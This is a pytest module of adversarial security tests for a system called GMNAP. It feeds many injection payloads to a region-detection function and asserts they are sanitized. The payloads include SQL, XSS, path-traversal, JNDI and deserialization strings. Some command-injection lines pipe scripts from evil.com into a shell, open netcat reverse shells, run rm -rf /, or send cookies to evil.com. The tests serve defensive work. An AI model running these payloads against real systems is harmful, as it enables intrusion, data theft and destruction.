"""
import unittest
HELL-LEVEL PARANOID SECURITY TESTING
=====================================

This module contains comprehensive adversarial security tests designed to break
the GMNAP system using every known attack vector. These tests are PARANOID and
designed to catch vulnerabilities that normal testing would miss.

WARNING: These tests contain actual attack payloads and malicious input.
"""

import pytest
import threading
import time
import gc
import os
import tempfile
import sqlite3
from pathlib import Path
from unittest.mock import patch, Mock
import sys

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent / "src"))

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.regions.manager_optimized import RegionManager
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.pipeline_v6 import GMNAPPipeline, PipelineMode
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.config import GMNAPConfig


class TestInjectionHell:
    """Hell-level injection attack testing."""

    @pytest.fixture
    def region_manager(self):
        """Fresh region manager for each test."""
        return RegionManager()

    @pytest.fixture
    def pipeline(self):
        """Test pipeline with memory database."""
        config = GMNAPConfig(database_path=":memory:")
        return GMNAPPipeline(config, mode=PipelineMode.QUICK)

    # ========== SQL INJECTION HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_sql_injection_classic_attacks(self, region_manager):
        """Test classic SQL injection vectors."""
        sql_payloads = [
            # Classic injection
            "Smith'; DROP TABLE users; --",
            "Smith' OR '1'='1",
            "Smith'; DELETE FROM entries; --",
            "Smith' UNION SELECT * FROM sqlite_master; --",
            # Advanced injection
            "Smith'; INSERT INTO entries VALUES ('hacked'); --",
            "Smith' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --",
            "Smith'; UPDATE entries SET name='pwned' WHERE 1=1; --",
            "Smith' OR EXISTS(SELECT * FROM sqlite_master) --",
            # Blind injection
            "Smith' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --",
            "Smith' AND (SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1)='t' --",
            # Time-based injection
            "Smith'; SELECT CASE WHEN (1=1) THEN sqlite_version() ELSE '' END; --",
            "Smith' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0 --",
            # Boolean-based injection
            "Smith' OR 1=1 #",
            "Smith' OR 'a'='a",
            "Smith' OR TRUE --",
            # Error-based injection
            "Smith' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "Smith' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        ]

        for payload in sql_payloads:
            entry = {"CanonicalLatin": payload}

            # Should not crash or leak information
            try:
                result = region_manager.detect_region(entry)
                # Verify the payload was sanitized
                assert payload not in str(result), f"SQL payload leaked through: {payload}"
                assert "DROP" not in str(result).upper(), f"SQL command in result: {payload}"
                assert "DELETE" not in str(result).upper(), f"SQL command in result: {payload}"
                assert "UNION" not in str(result).upper(), f"SQL command in result: {payload}"
            except Exception as e:
                # Should fail gracefully, not with SQL errors
                assert "sql" not in str(e).lower(), f"SQL error leaked: {e}"
                assert "syntax" not in str(e).lower(), f"SQL syntax error: {e}"

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_nosql_injection_attacks(self, region_manager):
        """Test NoSQL injection vectors."""
        nosql_payloads = [
            # MongoDB injection
            "Smith'; this.name == this.name; var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); return true; //",
            "Smith' || '1'=='1",
            "{'$where': 'this.name == this.name'}",
            "{'$regex': '.*'}",
            "{'$ne': null}",
            # CouchDB injection
            "Smith'; emit(null, null); //",
            "Smith' + '1' == '1",
            # Neo4j injection
            "Smith'; MATCH (n) DETACH DELETE n; //",
            "Smith' OR 1=1 //",
            # Redis injection
            "Smith\r\nFLUSHALL\r\n",
            "Smith\r\nCONFIG SET dir /tmp\r\n",
        ]

        for payload in nosql_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                # Verify NoSQL commands don't appear in output
                dangerous_keywords = ["MATCH", "DELETE", "FLUSHALL", "$where", "$regex", "emit"]
                for keyword in dangerous_keywords:
                    assert keyword not in str(result), f"NoSQL command leaked: {keyword}"
            except Exception as e:
                assert "mongodb" not in str(e).lower(), f"MongoDB error: {e}"
                assert "redis" not in str(e).lower(), f"Redis error: {e}"

    # ========== XSS INJECTION HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_xss_injection_comprehensive(self, region_manager):
        """Test comprehensive XSS attack vectors."""
        xss_payloads = [
            # Basic XSS
            "<script>alert('xss')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/xss/)</script>",
            # Event-based XSS
            "<img src=x onerror=alert('xss')>",
            "<body onload=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            # Encoding bypasses
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "&lt;script&gt;alert('xss')&lt;/script&gt;",
            "\\x3cscript\\x3ealert('xss')\\x3c/script\\x3e",
            # Advanced XSS
            "<script>alert(document.cookie)</script>",
            "<script>new Image().src='http://evil.com/'+document.cookie</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>",
            # HTML injection
            "<h1>Injected Content</h1>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('xss')>",
            # CSS injection
            "<style>body{background:url('javascript:alert(1)')}</style>",
            "<link rel=stylesheet href=javascript:alert('xss')>",
            # JavaScript pseudo-protocol
            "javascript:alert('xss')",
            "javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
            # Data URI XSS
            "data:text/html,<script>alert('xss')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
        ]

        for payload in xss_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check for script tags and dangerous content
                assert "<script" not in result_str.lower(), f"Script tag leaked: {payload}"
                assert (
                    "javascript:" not in result_str.lower()
                ), f"JavaScript protocol leaked: {payload}"
                assert "onerror=" not in result_str.lower(), f"Event handler leaked: {payload}"
                assert "onload=" not in result_str.lower(), f"Event handler leaked: {payload}"
                assert "alert(" not in result_str.lower(), f"Alert function leaked: {payload}"

            except Exception as e:
                # Should handle gracefully
                assert "javascript" not in str(e).lower(), f"JavaScript in error: {e}"

    # ========== PATH TRAVERSAL HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_path_traversal_comprehensive(self, region_manager):
        """Test comprehensive path traversal attacks."""
        path_payloads = [
            # Classic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow",
            # Encoded traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            # Double encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Unicode encoding
            "..%u002f..%u002f..%u002fetc%u002fpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            # Null byte injection
            "../../../etc/passwd%00.txt",
            "../../../etc/passwd\x00.png",
            # Long path names
            "../" * 100 + "etc/passwd",
            "..\\" * 100 + "windows\\win.ini",
            # Alternative separators
            "....//....//....//etc//passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
        ]

        for payload in path_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check for system paths
                dangerous_paths = [
                    "/etc/",
                    "/windows/",
                    "/system32/",
                    "passwd",
                    "shadow",
                    "win.ini",
                ]
                for path in dangerous_paths:
                    assert (
                        path not in result_str.lower()
                    ), f"System path leaked: {path} from {payload}"

                # Check for traversal sequences
                assert "../" not in result_str, f"Traversal sequence leaked: {payload}"
                assert "..\\" not in result_str, f"Traversal sequence leaked: {payload}"

            except Exception as e:
                assert "/etc/" not in str(e), f"System path in error: {e}"
                assert "passwd" not in str(e), f"System file in error: {e}"

    # ========== COMMAND INJECTION HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_command_injection_comprehensive(self, region_manager):
        """Test comprehensive command injection attacks."""
        command_payloads = [
            # Basic command injection
            "Smith; rm -rf /",
            "Smith && cat /etc/passwd",
            "Smith | nc -l -p 1234 -e /bin/bash",
            "Smith`whoami`",
            "Smith$(whoami)",
            # Command chaining
            "Smith; ls -la; cat /etc/passwd",
            "Smith && echo 'hacked' > /tmp/pwned.txt",
            "Smith || curl http://evil.com/malware.sh | sh",
            # Backgrounding
            "Smith & rm -rf / &",
            "Smith; (curl http://evil.com/payload.sh | sh) &",
            # Piping
            "Smith | tee /dev/tcp/evil.com/1234",
            "Smith | nc evil.com 1234",
            # Encoded commands
            "Smith; echo 'cm0gLXJmIC8K' | base64 -d | sh",
            "Smith; printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh",
            # Environment manipulation
            "Smith; export EVIL=payload; $EVIL",
            "Smith; PATH=/tmp:$PATH; malware",
            # Process substitution
            "Smith; cat <(echo 'malicious payload')",
            "Smith; >(cat) <<< 'evil command'",
        ]

        for payload in command_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check for command injection indicators
                dangerous_chars = [";", "|", "&", "`", "$", "<", ">"]
                dangerous_commands = ["rm", "cat", "curl", "wget", "nc", "sh", "bash"]

                for char in dangerous_chars:
                    if char in payload:  # Only check if it was in the original payload
                        assert (
                            char not in result_str
                        ), f"Command character leaked: {char} from {payload}"

                for cmd in dangerous_commands:
                    # CRITICAL FIX: Check for whole word matches, not substrings
                    # This prevents false positives like "nc" in "confidence"
                    # Use word boundaries to avoid false matches
                    if (
                        f" {cmd} " in f" {result_str.lower()} "
                        or result_str.lower().startswith(f"{cmd} ")
                        or result_str.lower().endswith(f" {cmd}")
                    ):
                        assert False, f"Command leaked: {cmd} from {payload}"

            except Exception as e:
                assert "command" not in str(e).lower(), f"Command error: {e}"

    # ========== UNICODE ATTACK HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_unicode_normalization_attacks(self, region_manager):
        """Test Unicode normalization and encoding attacks."""
        unicode_payloads = [
            # Null byte attacks
            "Smith\x00John",
            "Smith\u0000John",
            "Smith%00John",
            # BOM attacks
            "Smith\ufeffJohn",
            "\ufeffSmith, John",
            # Right-to-left override
            "Smith\u202eJohn",
            "Smith\u202dJohn",
            # Isolate characters
            "Smith\u2066John\u2069",
            "Smith\u2067John\u2069",
            # Homograph attacks
            "Ѕmith, John",  # Cyrillic S
            "Smith, Јohn",  # Cyrillic J
            "𝐒mith, John",  # Mathematical bold S
            # Zero-width attacks
            "Smith\u200bJohn",  # Zero-width space
            "Smith\u200cJohn",  # Zero-width non-joiner
            "Smith\u200dJohn",  # Zero-width joiner
            "Smith\u2060John",  # Word joiner
            # Combining character attacks
            "Smith\u0300\u0301\u0302John",  # Multiple combining chars
            "e\u0301\u0301\u0301",  # Multiple acute accents
            # Normalization bypasses
            "é\u0301",  # e + acute + acute (double combining)
            "ñ\u0303",  # n + tilde + tilde
            # Private use area
            "Smith\ue000John",
            "Smith\uf8ffJohn",
            # Surrogate pairs
            "Smith\ud800\udc00John",  # Valid surrogate pair
            "Smith\ud800John",  # Broken surrogate
            # Overlong UTF-8 sequences (conceptual in Python)
            "Smith\xc0\x80John",  # Overlong null
            # Control characters
            "Smith\x01\x02\x03John",
            "Smith\x7fJohn",
            "Smith\x80John",
            # Line/paragraph separators
            "Smith\u2028John",
            "Smith\u2029John",
            # Zalgo text
            "S̴̢̰̗̞̈́̀͘m̷̧̺̙̯̈́į̴̰̟̈́̚ẗ̷̢̰̗̞́̀͘ḧ̵̢̰̗̞́̀͘",
        ]

        for payload in unicode_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check that dangerous Unicode characters are handled
                # Most should be normalized or stripped
                assert "\x00" not in result_str, f"Null byte in result: {payload}"
                assert "\ufeff" not in result_str, f"BOM in result: {payload}"
                assert "\u202e" not in result_str, f"RTL override in result: {payload}"

                # Check normalization occurred
                import unicodedata

                normalized_result = unicodedata.normalize("NFC", result_str)
                # Result should be in normalized form

            except Exception as e:
                # Should handle Unicode gracefully
                assert "unicode" not in str(e).lower(), f"Unicode error: {e}"
                assert "encoding" not in str(e).lower(), f"Encoding error: {e}"

    # ========== FORMAT STRING ATTACKS ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_format_string_attacks(self, region_manager):
        """Test format string injection attacks."""
        format_payloads = [
            # Python format attacks
            "Smith {0.__class__}",
            "Smith {0.__class__.__bases__[0]}",
            "Smith {0.__class__.__subclasses__()}",
            "Smith {''.__class__.__mro__[1].__subclasses__()}",
            # Classic C format attacks (translated to Python context)
            "Smith %s %x %p",
            "Smith %n",
            "Smith %1000000d",
            "Smith %.*s",
            "Smith %100000s",
            # Python-specific format attacks
            "Smith {.__class__.__base__.__subclasses__()[104].__init__.__globals__[sys].exit()}",
            "Smith {().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()}",
            # f-string injection attempts
            "Smith {__import__('os').system('echo pwned')}",
            'Smith {eval(\'__import__("os").system("echo hacked")\')}',
            # Template injection
            "Smith ${7*7}",
            "Smith {{7*7}}",
            "Smith {%raw%}{{7*7}}{%endraw%}",
        ]

        for payload in format_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check that format strings weren't executed
                assert "__class__" not in result_str, f"Class access leaked: {payload}"
                assert "__bases__" not in result_str, f"Base access leaked: {payload}"
                assert "__subclasses__" not in result_str, f"Subclass access leaked: {payload}"
                assert "import" not in result_str.lower(), f"Import leaked: {payload}"
                assert "eval" not in result_str.lower(), f"Eval leaked: {payload}"
                assert "system" not in result_str.lower(), f"System leaked: {payload}"

                # Check for format artifacts
                assert (
                    "49" not in result_str or "7*7" not in payload
                ), f"Format execution: {payload}"

            except Exception as e:
                # Should not reveal internal structure
                assert "__" not in str(e), f"Internal structure in error: {e}"

    # ========== LDAP INJECTION ATTACKS ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_ldap_injection_attacks(self, region_manager):
        """Test LDAP injection attacks."""
        ldap_payloads = [
            # Basic LDAP injection
            "Smith)(objectClass=*",
            "Smith)(|(password=*)",
            "Smith*)(uid=*))(|(uid=*",
            # Log4j-style attacks
            "${jndi:ldap://evil.com/exploit}",
            "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}",
            "${jndi:dns://evil.com}",
            "${jndi:rmi://evil.com:1099/exploit}",
            # LDAP filter bypass
            "Smith*)(&(objectClass=user)(cn=*",
            "Smith*))((objectClass=*))",
            # Blind LDAP injection
            "Smith*)(mail=*))%00",
            "Smith*)(|(mail=*))",
        ]

        for payload in ldap_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check for LDAP injection indicators
                assert "${jndi:" not in result_str, f"JNDI injection leaked: {payload}"
                assert "objectClass" not in result_str, f"LDAP attribute leaked: {payload}"
                assert "ldap://" not in result_str, f"LDAP URL leaked: {payload}"

            except Exception as e:
                assert "ldap" not in str(e).lower(), f"LDAP error: {e}"

    # ========== DESERIALIZATION ATTACKS ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_deserialization_attacks(self, region_manager):
        """Test deserialization attack vectors."""
        deser_payloads = [
            # Python pickle attacks (base64 encoded malicious pickle)
            "gASVOQAAAAAAAAB9lCiMBF9fbmFtZZSMCF9fYnVpbHRpbl9flFIUjARleGVjlFIUjARjb2RllFIU",
            # Java serialization attacks
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZA==",
            # .NET serialization
            "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFs",
            # JSON with dangerous content
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            # YAML bombs
            "Smith !!python/object/apply:os.system ['echo pwned']",
            "Smith !!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]",
        ]

        for payload in deser_payloads:
            entry = {"CanonicalLatin": payload}

            try:
                result = region_manager.detect_region(entry)
                result_str = str(result)

                # Check for deserialization indicators
                assert "python/object" not in result_str, f"Python object leaked: {payload}"
                assert "__proto__" not in result_str, f"Prototype pollution: {payload}"
                assert "constructor" not in result_str, f"Constructor access: {payload}"

            except Exception as e:
                assert "pickle" not in str(e).lower(), f"Pickle error: {e}"
                assert "deserialize" not in str(e).lower(), f"Deserialization error: {e}"

    # ========== RESOURCE EXHAUSTION ATTACKS ==========

    @pytest.mark.paranoid
    @pytest.mark.slow
    @pytest.mark.timeout(15)
    def test_resource_exhaustion_attacks(self, region_manager):
        """Test resource exhaustion and DoS attacks."""

        # Memory exhaustion
        huge_string = "A" * (10 * 1024 * 1024)  # 10MB string
        entry = {"CanonicalLatin": huge_string}

        try:
            # Should handle large input gracefully
            result = region_manager.detect_region(entry)
            # Should not return the huge string
            assert len(str(result)) < 1000, "Huge string not truncated"
        except Exception as e:
            # Should fail gracefully with memory limits
            assert "memory" in str(e).lower() or "size" in str(e).lower()

        # Nested structure attack
        deeply_nested = {"CanonicalLatin": "Smith"}
        for i in range(1000):
            deeply_nested = {"nested": deeply_nested}

        try:
            # Should handle deep nesting
            str(deeply_nested)  # This might fail due to recursion
        except RecursionError:
            pass  # Expected

        # ReDoS (Regular Expression Denial of Service)
        redos_patterns = [
            "a" * 10000 + "X",  # If regex is like (a+)+, this causes catastrophic backtracking
            "(" * 10000 + "a" + ")" * 10000,  # Nested groups
        ]

        for pattern in redos_patterns:
            entry = {"CanonicalLatin": pattern}
            start_time = time.time()

            try:
                result = region_manager.detect_region(entry)
                processing_time = time.time() - start_time

                # Should not take more than 5 seconds for any input
                assert (
                    processing_time < 5.0
                ), f"ReDoS detected: {processing_time}s for pattern length {len(pattern)}"

            except Exception as e:
                processing_time = time.time() - start_time
                assert processing_time < 5.0, f"ReDoS in exception: {processing_time}s"

    # ========== RACE CONDITION HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.slow
    @pytest.mark.timeout(15)
    def test_race_condition_attacks(self, region_manager):
        """Test race condition vulnerabilities."""

        results = []
        errors = []

        def worker(thread_id):
            """Worker function for threading tests."""
            try:
                for i in range(100):
                    entry = {"CanonicalLatin": f"Smith{thread_id}-{i}"}
                    result = region_manager.detect_region(entry)
                    results.append((thread_id, i, result))
            except Exception as e:
                errors.append((thread_id, e))

        # Launch 10 threads hammering the region manager
        threads = []
        for i in range(10):
            thread = threading.Thread(target=worker, args=(i,))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=30)  # 30 second timeout

        # Verify results
        assert len(errors) == 0, f"Race condition errors: {errors}"
        assert len(results) == 1000, f"Expected 1000 results, got {len(results)}"

        # Check for data corruption
        region_codes = [r[2].region_code for r in results if hasattr(r[2], "region_code")]
        valid_regions = {
            "A1",
            "A2",
            "B1",
            "B2",
            "C2",
            "C3",
            "C4",
            "D1",
            "E1",
            "E3",
            "E4",
            "G1",
            "A3",
            "B3",
        }

        for code in region_codes:
            assert code in valid_regions, f"Invalid region code from race condition: {code}"

    # ========== TIMING ATTACK HELL ==========

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_timing_attack_resistance(self, region_manager):
        """Test resistance to timing attacks."""

        # Test if processing time reveals information about internal state
        test_cases = [
            "Smith",  # Valid name
            "X" * 100,  # Invalid long name
            "",  # Empty name
            "김정은",  # Korean name (different processing path)
            "INVALID",  # Invalid name
        ]

        timings = {}

        for test_case in test_cases:
            times = []

            # Run each test 10 times to get average timing
            for _ in range(10):
                entry = {"CanonicalLatin": test_case}
                start_time = time.perf_counter()

                try:
                    result = region_manager.detect_region(entry)
                except Exception:
                    pass  # We only care about timing

                end_time = time.perf_counter()
                times.append(end_time - start_time)

            timings[test_case] = sum(times) / len(times)

        # Check that timing differences aren't too revealing
        min_time = min(timings.values())
        max_time = max(timings.values())

        # Timing difference shouldn't be more than 10x
        # (This is generous - in crypto, we'd want < 2x)
        timing_ratio = max_time / min_time if min_time > 0 else float("inf")
        assert (
            timing_ratio < 10.0
        ), f"Timing attack possible: {timing_ratio}x difference in {timings}"


@pytest.mark.paranoid
class TestAdvancedSecurityScenarios:
    """Advanced security scenarios and edge cases."""

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_state_corruption_attacks(self):
        """Test attacks that try to corrupt internal state."""
        manager = RegionManager()

        # Try to corrupt the manager's internal state
        malicious_inputs = [
            {"CanonicalLatin": "Smith", "_internal": "corrupted"},
            {"CanonicalLatin": "Smith", "__dict__": {"hacked": True}},
            {"CanonicalLatin": "Smith", "__class__": "hacked"},
        ]

        for malicious_input in malicious_inputs:
            try:
                result = manager.detect_region(malicious_input)

                # Verify internal state wasn't corrupted
                assert hasattr(manager, "_regions"), "Internal state corrupted"
                assert not hasattr(manager, "hacked"), "State corruption successful"

            except Exception as e:
                # Should fail safely
                assert "internal" not in str(e).lower(), f"Internal state leak: {e}"

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_cache_poisoning_attacks(self):
        """Test cache poisoning vulnerabilities."""
        manager = RegionManager()

        # Try to poison caches with malicious data
        poison_attempts = [
            {"CanonicalLatin": "Smith<script>alert('xss')</script>"},
            {"CanonicalLatin": "Smith'; DROP TABLE cache; --"},
            {"CanonicalLatin": "Smith" + "\x00" + "cached_poison"},
        ]

        # First requests to potentially poison cache
        for attempt in poison_attempts:
            try:
                manager.detect_region(attempt)
            except Exception:
                pass

        # Second requests to see if poison worked
        clean_entry = {"CanonicalLatin": "Smith, John"}
        result = manager.detect_region(clean_entry)

        result_str = str(result)
        assert "<script>" not in result_str, "XSS cache poisoning"
        assert "DROP TABLE" not in result_str, "SQL cache poisoning"
        assert "\x00" not in result_str, "Null byte cache poisoning"

    @pytest.mark.paranoid
    @pytest.mark.timeout(15)
    def test_memory_disclosure_attacks(self):
        """Test for memory disclosure vulnerabilities."""
        manager = RegionManager()

        # Try to trigger memory disclosure
        disclosure_attempts = [
            {"CanonicalLatin": "Smith" + "\x00" * 1000},  # Null byte padding
            {"CanonicalLatin": "Smith%s%s%s%s%s"},  # Format string
            {"CanonicalLatin": "Smith" + "A" * 10000},  # Buffer overflow attempt
        ]

        for attempt in disclosure_attempts:
            try:
                result = manager.detect_region(attempt)
                result_str = str(result)

                # Should not contain memory addresses or internal data
                assert "0x" not in result_str, f"Memory address disclosed: {result_str}"
                assert "<built-in" not in result_str, f"Internal object disclosed: {result_str}"
                assert "object at" not in result_str, f"Object reference disclosed: {result_str}"

            except Exception as e:
                error_str = str(e)
                assert "0x" not in error_str, f"Memory address in error: {error_str}"
                assert "<built-in" not in error_str, f"Internal object in error: {error_str}"


if __name__ == "__main__":
    # Run with: pytest tests/paranoid/security/test_injection_hell.py -v --tb=short
    pytest.main([__file__, "-v", "--tb=short"])
